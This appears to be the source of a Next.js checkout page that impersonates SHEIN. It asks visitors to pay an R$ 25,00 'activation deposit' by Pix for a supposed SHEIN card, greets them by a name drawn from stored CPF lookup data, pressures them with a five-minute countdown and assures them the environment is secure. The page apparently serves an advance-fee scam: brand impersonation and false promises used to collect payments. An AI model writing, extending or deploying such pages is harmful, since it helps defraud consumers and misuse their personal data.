"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Shield, ArrowLeft } from "lucide-react"
import { usePureWebhookMonitor } from "@/hooks/use-pure-webhook-monitor"

export default function UppCheckoutPage() {
  const [copied, setCopied] = useState(false)
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [userName, setUserName] = useState("")

  const router = useRouter()

  // Monitor webhook para confirmação de pagamento
  const { isConfirmed } = usePureWebhookMonitor({
    invoiceId: invoice?.external_id,
    onConfirmed: () => {
      console.log("✅ Pagamento de ativação SuperPayBR confirmado via webhook!")
      // Redirecionar para /upp10 em vez de /upp/success
      setTimeout(() => {
        router.push("/upp10")
      }, 1000)
    },
    onError: (error) => {
      console.error("❌ Erro no webhook SuperPayBR:", error)
    },
  })

  useEffect(() => {
    // Carregar dados do usuário
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    setUserName(cpfData.nome?.split(" ")[0] || "")

    // Criar fatura de ativação SuperPayBR
    createActivationInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [timeLeft])

  const createActivationInvoice = async () => {
    try {
      setLoading(true)

      const response = await fetch("/api/superpaybr/create-activation-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: 25.0,
          description: "Depósito de Ativação - SHEIN Card",
        }),
      })

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }

      const data = await response.json()
      setInvoice(data.data)
      localStorage.setItem("activationInvoiceSuperPayBR", JSON.stringify(data.data))
    } catch (error) {
      console.error("Erro ao criar fatura de ativação SuperPayBR:", error)
    } finally {
      setLoading(false)
    }
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Processando SuperPayBR...</h2>
            <p className="text-gray-600">Criando fatura de ativação</p>
          </div>
        </div>
      </main>
    )
  }

  if (isConfirmed) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold mb-2 text-green-600">Pagamento Confirmado!</h2>
            <p className="text-gray-600 mb-4">Redirecionando para próxima etapa...</p>
            <div className="animate-pulse bg-gray-200 h-2 rounded-full"></div>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6">
          {/* Header */}
          <div className="mb-6">
            <button onClick={() => router.back()} className="mb-4 p-2 text-gray-600 hover:text-gray-800">
              <ArrowLeft className="w-5 h-5" />
            </button>

            {/* SHEIN Logo */}
            <div className="text-center mb-6">
              <Image src="/shein-logo-updated.png" alt="SHEIN" width={120} height={40} className="mx-auto" priority />
            </div>

            <h1 className="text-2xl font-bold mb-4 text-gray-800">
              {userName && `Olá ${userName}! `}Depósito de Ativação
            </h1>

            <p className="text-gray-600 text-sm mb-4">
              Para ativar seu cartão SHEIN, é necessário fazer um depósito de ativação de R$ 25,00. Este valor será
              creditado como limite no seu cartão após a aprovação.
            </p>
          </div>

          {/* Payment Section */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-6">
            <div className="text-center mb-4">
              <div className="flex items-center justify-center space-x-2 mb-2">
                <span className="text-lg font-bold">Pague via Pix</span>
                <div className="w-6 h-6 bg-teal-500 rounded"></div>
              </div>
              <p className="text-sm text-gray-600">Confirmação automática via webhook SuperPayBR</p>
            </div>

            {/* Amount */}
            <div className="text-center mb-6">
              <p className="text-4xl font-bold text-teal-600">R$ 25,00</p>
              <p className="text-sm text-gray-500">Depósito de Ativação</p>
            </div>

            {/* QR Code */}
            {invoice && (
              <div className="text-center mb-6">
                <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
                  <Image
                    src={invoice.pix.qr_code || "/placeholder.svg"}
                    alt="QR Code PIX"
                    width={200}
                    height={200}
                    className="mx-auto"
                  />
                </div>
                <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
              </div>
            )}

            {/* PIX Code */}
            {invoice && (
              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={invoice.pix.payload}
                    readOnly
                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
                  />
                  <button
                    onClick={copyPixCode}
                    className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                      copied ? "bg-green-500 text-white" : "bg-gray-200 text-gray-700 hover:bg-gray-300"
                    }`}
                  >
                    {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                  </button>
                </div>
                {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
              </div>
            )}

            {/* Security */}
            <div className="flex items-center justify-center space-x-2 text-gray-600 mb-4">
              <Shield className="w-4 h-4" />
              <span className="text-sm">Ambiente seguro SuperPayBR</span>
            </div>
          </div>

          {/* Timer */}
          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Tempo restante: <span className="font-bold text-red-600">{formatTime(timeLeft)}</span>
            </p>
          </div>

          {/* Info */}
          <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
            <p className="text-sm text-blue-800 text-center">
              💡 <strong>Importante:</strong> O depósito será convertido em limite do cartão após aprovação
            </p>
          </div>
        </div>
      </div>
    </main>
  )
}
